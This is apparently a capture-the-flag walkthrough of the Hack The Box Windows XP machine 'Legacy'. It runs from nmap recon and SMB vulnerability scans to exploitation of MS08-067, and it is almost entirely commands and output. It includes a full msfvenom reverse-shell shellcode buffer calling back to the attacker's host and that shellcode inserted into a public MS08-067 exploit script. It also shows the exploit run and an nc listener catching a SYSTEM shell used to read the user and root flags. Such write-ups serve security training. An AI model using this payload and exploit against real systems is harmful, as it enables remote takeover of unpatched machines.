RECON
root@kali:~/htb/legacy# nmap -sC -sV -Pn  10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-31 08:45 EDT
Nmap scan report for 10.10.10.4
Host is up (0.018s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h02m24s, deviation: 1h24m51s, median: 5d00h02m24s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:06:63 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-11-05T16:48:10+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

ENUM SMB
root@kali:~/htb/legacy# nmap --script smb-vuln-* 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-31 10:38 EDT
Nmap scan report for 10.10.10.4
Host is up (0.018s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143



EXPLOIT MS08_067

  
root@kali:~/htb/legacy# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] = 
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x22\x15\xda\xb9\x83\xee\xfc\xe2\xf4\xde\xfd\x58\xb9\x22\x15"
"\xba\x30\xc7\x24\x1a\xdd\xa9\x45\xea\x32\x70\x19\x51\xeb\x36"
"\x9e\xa8\x91\x2d\xa2\x90\x9f\x13\xea\x76\x85\x43\x69\xd8\x95"
"\x02\xd4\x15\xb4\x23\xd2\x38\x4b\x70\x42\x51\xeb\x32\x9e\x90"
"\x85\xa9\x59\xcb\xc1\xc1\x5d\xdb\x68\x73\x9e\x83\x99\x23\xc6"
"\x51\xf0\x3a\xf6\xe0\xf0\xa9\x21\x51\xb8\xf4\x24\x25\x15\xe3"
"\xda\xd7\xb8\xe5\x2d\x3a\xcc\xd4\x16\xa7\x41\x19\x68\xfe\xcc"
"\xc6\x4d\x51\xe1\x06\x14\x09\xdf\xa9\x19\x91\x32\x7a\x09\xdb"
"\x6a\xa9\x11\x51\xb8\xf2\x9c\x9e\x9d\x06\x4e\x81\xd8\x7b\x4f"
"\x8b\x46\xc2\x4a\x85\xe3\xa9\x07\x31\x34\x7f\x7d\xe9\x8b\x22"
"\x15\xb2\xce\x51\x27\x85\xed\x4a\x59\xad\x9f\x25\xea\x0f\x01"
"\xb2\x14\xda\xb9\x0b\xd1\x8e\xe9\x4a\x3c\x5a\xd2\x22\xea\x0f"
"\xe9\x72\x45\x8a\xf9\x72\x55\x8a\xd1\xc8\x1a\x05\x59\xdd\xc0"
"\x4d\xd3\x27\x7d\xd0\xb3\x2c\x1d\xb2\xbb\x22\x14\x61\x30\xc4"
"\x7f\xca\xef\x75\x7d\x43\x1c\x56\x74\x25\x6c\xa7\xd5\xae\xb5"
"\xdd\x5b\xd2\xcc\xce\x7d\x2a\x0c\x80\x43\x25\x6c\x4a\x76\xb7"
"\xdd\x22\x9c\x39\xee\x75\x42\xeb\x4f\x48\x07\x83\xef\xc0\xe8"
"\xbc\x7e\x66\x31\xe6\xb8\x23\x98\x9e\x9d\x32\xd3\xda\xfd\x76"
"\x45\x8c\xef\x74\x53\x8c\xf7\x74\x43\x89\xef\x4a\x6c\x16\x86"
"\xa4\xea\x0f\x30\xc2\x5b\x8c\xff\xdd\x25\xb2\xb1\xa5\x08\xba"
"\x46\xf7\xae\x3a\xa4\x08\x1f\xb2\x1f\xb7\xa8\x47\x46\xf7\x29"
"\xdc\xc5\x28\x95\x21\x59\x57\x10\x61\xfe\x31\x67\xb5\xd3\x22"
"\x46\x25\x6c";

ADD MSFVENOM PAYLOAD TO MS08_067 EXPLOIT
# Reverse TCP to 10.10.14.8 port 443:
shellcode=(
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x22\x15\xda\xb9\x83\xee\xfc\xe2\xf4\xde\xfd\x58\xb9\x22\x15"
"\xba\x30\xc7\x24\x1a\xdd\xa9\x45\xea\x32\x70\x19\x51\xeb\x36"
"\x9e\xa8\x91\x2d\xa2\x90\x9f\x13\xea\x76\x85\x43\x69\xd8\x95"
"\x02\xd4\x15\xb4\x23\xd2\x38\x4b\x70\x42\x51\xeb\x32\x9e\x90"
"\x85\xa9\x59\xcb\xc1\xc1\x5d\xdb\x68\x73\x9e\x83\x99\x23\xc6"
"\x51\xf0\x3a\xf6\xe0\xf0\xa9\x21\x51\xb8\xf4\x24\x25\x15\xe3"
"\xda\xd7\xb8\xe5\x2d\x3a\xcc\xd4\x16\xa7\x41\x19\x68\xfe\xcc"
"\xc6\x4d\x51\xe1\x06\x14\x09\xdf\xa9\x19\x91\x32\x7a\x09\xdb"
"\x6a\xa9\x11\x51\xb8\xf2\x9c\x9e\x9d\x06\x4e\x81\xd8\x7b\x4f"
"\x8b\x46\xc2\x4a\x85\xe3\xa9\x07\x31\x34\x7f\x7d\xe9\x8b\x22"
"\x15\xb2\xce\x51\x27\x85\xed\x4a\x59\xad\x9f\x25\xea\x0f\x01"
"\xb2\x14\xda\xb9\x0b\xd1\x8e\xe9\x4a\x3c\x5a\xd2\x22\xea\x0f"
"\xe9\x72\x45\x8a\xf9\x72\x55\x8a\xd1\xc8\x1a\x05\x59\xdd\xc0"
"\x4d\xd3\x27\x7d\xd0\xb3\x2c\x1d\xb2\xbb\x22\x14\x61\x30\xc4"
"\x7f\xca\xef\x75\x7d\x43\x1c\x56\x74\x25\x6c\xa7\xd5\xae\xb5"
"\xdd\x5b\xd2\xcc\xce\x7d\x2a\x0c\x80\x43\x25\x6c\x4a\x76\xb7"
"\xdd\x22\x9c\x39\xee\x75\x42\xeb\x4f\x48\x07\x83\xef\xc0\xe8"
"\xbc\x7e\x66\x31\xe6\xb8\x23\x98\x9e\x9d\x32\xd3\xda\xfd\x76"
"\x45\x8c\xef\x74\x53\x8c\xf7\x74\x43\x89\xef\x4a\x6c\x16\x86"
"\xa4\xea\x0f\x30\xc2\x5b\x8c\xff\xdd\x25\xb2\xb1\xa5\x08\xba"
"\x46\xf7\xae\x3a\xa4\x08\x1f\xb2\x1f\xb7\xa8\x47\x46\xf7\x29"
"\xdc\xc5\x28\x95\x21\x59\x57\x10\x61\xfe\x31\x67\xb5\xd3\x22"
"\x46\x25\x6c"
)
# ------------------------------------------------------------------------

TEST THESE WINDOWS XP COMMANDS
Usage: ms08_067.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

ENSURE IMPACKET INSTALLED AT THIS VERSION OR ABOVE
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


RUN THIS XP COMMAND
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)

root@kali:~/htb/legacy# python ms08_067.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

GOT ROOT SHELL
root@kali:~/htb/legacy# nc -lvp 443
listening on [any] 443 ...
10.10.10.4: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.4] 1030
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>ipconfig   
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . : 
        IP Address. . . . . . . . . . . . : 10.10.10.4
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 10.10.10.2

C:\WINDOWS\system32>cd C:\Users
cd C:\Users
The system cannot find the path specified.

C:\WINDOWS\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  07:30 ��                 0 AUTOEXEC.BAT
16/03/2017  07:30 ��                 0 CONFIG.SYS
16/03/2017  08:07 ��    <DIR>          Documents and Settings
29/12/2017  10:41 ��    <DIR>          Program Files
06/11/2020  12:16 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.313.291.776 bytes free

C:\>cd Documents and Settings
cd Documents and Settings

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:07 ��    <DIR>          Administrator
16/03/2017  07:29 ��    <DIR>          All Users
16/03/2017  07:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.313.291.776 bytes free

USER FLAG

C:\Documents and Settings>dir john\Desktop\user.txt
dir john\Desktop\user.txt
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               0 Dir(s)   6.313.287.680 bytes free

C:\Documents and Settings>type john\Desktop\user.txt
type john\Desktop\user.txt
#####################################

ROOT FLAG
C:\Documents and Settings>dir Administrator\Desktop\   
dir Administrator\Desktop\
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  08:18 ��    <DIR>          .
16/03/2017  08:18 ��    <DIR>          ..
16/03/2017  08:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.313.275.392 bytes free


C:\Documents and Settings>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
#######################################


